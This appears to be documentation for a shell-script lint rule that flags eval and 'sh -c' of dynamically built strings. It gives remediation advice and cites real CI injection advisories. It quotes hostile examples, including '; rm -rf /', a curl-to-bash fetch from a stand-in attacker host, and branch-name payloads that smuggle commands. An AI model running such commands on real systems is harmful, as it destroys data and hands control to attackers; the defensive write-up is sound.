---
title: "VNX-BASH-001 – eval or sh -c of a Dynamically Built String"
description: "Reports a shell eval, or a bash/sh/zsh/ksh/dash -c command string, whose text contains a variable, positional parameter, dynamic command substitution or the output of a download or decoder, so the shell re-parses data as code."
---

## Overview

This rule reports an `eval` statement, and a `bash`/`sh`/`zsh`/`ksh`/`dash -c` command string, whose text contains an expansion the shell re-parses as code: a variable or positional parameter (`$cmd`, `${x}`, `$1`, `$@`), a command substitution whose own command line is dynamic, or the output of a download or decoder (`$(curl ...)`, `$(wget ...)`, `$(... | base64 -d)`). Variables assigned only constant strings in the same file count as constant, and the indirect-reference idiom `eval "x=\$$name"` is reported when the name comes from a positional parameter or `read`. Not reported: static or single-quoted strings, escaped `\$`, `eval "$(tool init)"` of a local tool's own output, getopt's `eval set -- "$opts"`, `sh -c 'script' _ "$arg"` (the value is passed as an argument), eval inside a string, comment or usage here-document, and generated `gradlew`/`mvnw` wrappers.

`eval` causes the shell to re-parse and execute its argument as a new shell command. When any portion of the string passed to `eval` originates from user input, an environment variable set by an untrusted source, a file path, or the output of an external command, an attacker who controls that portion can inject arbitrary shell commands that execute with the script's full privileges.

**Severity:** Critical | **CWE:** [CWE-78 – Improper Neutralisation of Special Elements Used in an OS Command](https://cwe.mitre.org/data/definitions/78.html) | **CAPEC:** [CAPEC-88 – OS Command Injection](https://capec.mitre.org/data/definitions/88.html)

**OWASP ASVS 4.0 – V5.3.8:** Verify that the application protects against OS command injection and that operating system calls use parameterized OS queries or use contextual command line output encoding. (Applies at Level 1, 2, and 3.)

## Why This Matters

`eval` is one of the most dangerous constructs in shell scripting precisely because it grants the programmer the ability to construct commands dynamically — and grants an attacker the same ability. Command injection via `eval` requires no memory corruption or kernel exploits: if the attacker can influence any byte of the evaluated string, they can append `; rm -rf /`, `; curl attacker.com/shell | bash`, or any other command, and it will execute with the full permissions of the running process.

**Real-world examples:**

- **GitHub Actions CI/CD injection (GHSL-2023-100, 2023)** — The Apache Ignite workflow passed the attacker-controlled `${{ github.head_ref }}` branch name into shell commands. An attacker created a pull request from a branch named `master;echo${IFS}"hello";#` to execute injected code in the CI pipeline and exfiltrate the `SONARCLOUD_TOKEN`. Scripts that pass such values through `eval` are directly exploitable.
- **CVE-2023-49291 (tj-actions/branch-names)** — The `branch-names` GitHub Action embedded `github.head_ref` in a shell `run` step. An attacker supplied a branch name containing `${IFS}&&curl${IFS}...${IFS}|${IFS}bash` to download and execute a remote payload with CI permissions.
- **ShellShock (CVE-2014-6271)** — The ShellShock vulnerability was itself a form of `eval`-equivalent behaviour in Bash's function-export mechanism, demonstrating how dynamic shell re-parsing can be weaponised at scale to compromise web servers exposed via CGI.
- **Build script privilege escalation** — CI/CD build scripts frequently run with access to deployment keys, cloud credentials, and package-signing keys. An `eval` of attacker-influenced content in such a context typically leads to full pipeline takeover.

ATT&CK technique T1059.004 (Command and Scripting Interpreter: Unix Shell) covers this class of command injection. Even when the developer believes they control the input, dynamic `eval` is a maintenance hazard — future refactoring may introduce a new code path that feeds external input into the evaluated string without the security implication being recognised.

## What Gets Flagged

```bash
eval "$(curl -fsSL https://config.example.internal/env/production)"   # FLAGGED
eval "$(echo "$REMOTE_SNIPPET" | base64 -d)"                          # FLAGGED
bash -c "$TASK_COMMAND"                                               # FLAGGED
sh -c "cd $target && make install"                                    # FLAGGED
[ -n "$hook" ] && eval "$hook"                                        # FLAGGED
```

Not flagged:

```bash
eval "set -euo pipefail"              # static string
eval "$(direnv hook bash)"            # a local tool's own shell setup
eval set -- "$(getopt -o hv -- "$@")" # getopt quotes its output for eval
sh -c 'cp "$1" /backup/' _ "$file"    # value passed as an argument, not code
```

## Remediation

**Default Bash behaviour:** Bash does not restrict `eval` in any way — it is the script author's responsibility to avoid or constrain it. Secure usage requires explicit code refactoring.

1. **Eliminate `eval` entirely.** Most uses of `eval` can be replaced with arrays, `declare`, parameter expansion, `case` statements, or direct command invocation.

2. **Use arrays for dynamic command construction.** Build a command as a Bash array and execute it directly instead of constructing a string. Arrays preserve argument boundaries even when values contain spaces or shell metacharacters.

3. **If `eval` is genuinely necessary**, restrict it strictly to a static string you control entirely — a string with no variable references and no command substitutions. Never allow any externally sourced value to appear inside the evaluated string.

4. **Validate and allowlist before any dynamic dispatch.** If you must dispatch dynamically based on input, use a `case` statement with an explicit allowlist of valid options rather than building and evaluating a string.

```bash
# SAFE: use an array to build dynamic commands — no eval needed
cmd_args=("docker" "run" "--rm")
if [[ "$debug" == "true" ]]; then
    cmd_args+=("--entrypoint" "bash")
fi
cmd_args+=("$IMAGE_NAME")
"${cmd_args[@]}"

# SAFE: case statement replaces eval-based dispatch; fails closed on unknown input
run_task() {
    local task="$1"
    case "$task" in
        build)   do_build ;;
        test)    do_test ;;
        deploy)  do_deploy ;;
        *)       echo "Unknown task: $task" >&2; exit 1 ;;
    esac
}

# SAFE: declare -n nameref (Bash 4.3+) instead of eval to expand variable names dynamically
declare -n ref="$varname"
echo "$ref"
```

## References

- [CWE-78: Improper Neutralisation of Special Elements Used in an OS Command](https://cwe.mitre.org/data/definitions/78.html)
- [CAPEC-88: OS Command Injection](https://capec.mitre.org/data/definitions/88.html)
- [OWASP ASVS 4.0 – V5.3.8: OS Command Injection](https://owasp-aasvs4.readthedocs.io/en/latest/5.3.8.html)
- [OWASP – OS Command Injection Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html)
- [BashFAQ/048 – Why should eval be avoided in Bash?](https://mywiki.wooledge.org/BashFAQ/048)
- [ShellCheck SC2046 – Quote this to prevent word splitting](https://www.shellcheck.net/wiki/SC2046)
- [ShellCheck SC2006 – Use `$(...)` notation instead of legacy backticks](https://www.shellcheck.net/wiki/SC2006)
- [MITRE ATT&CK T1059.004 – Command and Scripting Interpreter: Unix Shell](https://attack.mitre.org/techniques/T1059/004/)
- [GitHub Security Lab GHSL-2023-100 – Apache Ignite command injection](https://securitylab.github.com/advisories/GHSL-2023-100_Apache_Ignite/)
- [CVE-2023-49291 – tj-actions/branch-names script injection](https://github.com/advisories/GHSA-8v8w-v8xg-79rf)
- [GitHub Docs – Script injections in GitHub Actions](https://docs.github.com/en/actions/concepts/security/script-injections)
